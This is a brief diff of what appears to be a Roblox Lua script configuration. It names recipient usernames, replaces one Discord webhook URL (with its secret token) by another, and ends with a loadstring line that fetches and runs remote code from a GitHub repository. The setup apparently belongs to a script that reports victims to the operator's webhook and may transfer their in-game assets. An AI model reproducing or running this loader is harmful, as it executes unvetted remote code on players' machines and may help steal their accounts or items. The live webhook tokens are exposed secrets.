@@ -1,5 +1,5 @@
 UserName = "joethedonator"
 UserName2 = "Justun_happy" -- optional delete the whole line if you don't want it
-Webhook = "https://discord.com/api/webhooks/1084249416564756600/LMQwllct8YL-oWxArDedhMo-SW4G5wBj8HIf-bXJsJQa-vl8UVL3Wp4ycfqoV6s1m-Fc" -- optional delete the whole line if you don't want it
+Webhook = "https://discord.com/api/webhooks/1084229023070167142/weAE5caKNYqPRrt6MD77iEpYe8eq4OOfra0X8v_xnO9jMZJA0kIZZQKafn-_EzrnYk8r" -- optional delete the whole line if you don't want it
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/New.lua"))()
